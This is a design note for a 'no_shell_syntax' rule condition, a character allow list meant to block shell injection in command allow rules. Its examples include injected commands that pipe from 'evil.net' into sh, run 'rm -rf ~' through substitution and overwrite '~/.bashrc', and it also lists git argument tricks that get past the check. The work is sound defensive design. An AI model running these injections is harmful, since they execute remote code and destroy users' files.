# Design: `no_shell_syntax` (commands without shell tricks)

## Problem

`allow when command startswith "git "` is the natural way to allow a family of commands,
but a tool that hands the text to a shell also runs `git status; curl evil.net | sh`,
`git log $(rm -rf ~)` or `git diff > ~/.bashrc`. `contains` can't fix it (a tripwire,
refused in allow rules), and `eq` / `in` only work for a fixed list of exact commands.

## Approach

A condition op that takes no value: `{"arg": "command", "op": "no_shell_syntax"}`.
It holds only when the text uses **plain characters**: ASCII letters, digits, space, and
`- _ . / : = , @ + %`, with no word starting with `=` (zsh expands `=cmd`). Everything
else fails: `; | & $ \` < > ( ) { } [ ] * ? ! ~ # ' " \`, tabs, newlines, non-ASCII.

- It's an **allow list of characters**, not a list of dangerous ones: a character nobody
  thought of fails (default deny).
- Meant next to `startswith` / `eq` in allow rules, usually with `otherwise`:

```json
{"id": "git", "tool": "shell", "effect": "allow",
 "when": [{"arg": "command", "op": "startswith", "value": "git "},
          {"arg": "command", "op": "no_shell_syntax"}],
 "otherwise": "require_approval"}
```

- Not text: uncheckable (deny). Missing: like other ops (an allow rule doesn't apply).

## Threat model

Stops shell syntax from turning one allowed command into several, or into a redirect,
substitution, glob or variable expansion: the shell runs exactly the words written.

## What it doesn't cover

- **Dangerous arguments of the allowed program**: `git -c core.pager=sh log` or
  `git status --output=/etc/x` are plain words. Allow-list exact commands (`eq` / `in`)
  where that matters, or use a tool argument list with separate argv items.
- Quoted arguments (`git commit -m "fix"`) fail: quotes can't be checked. Allow them
  with `eq`, or let `otherwise` send them to a human.
- Tools that don't use a shell don't need it (it does no harm there).
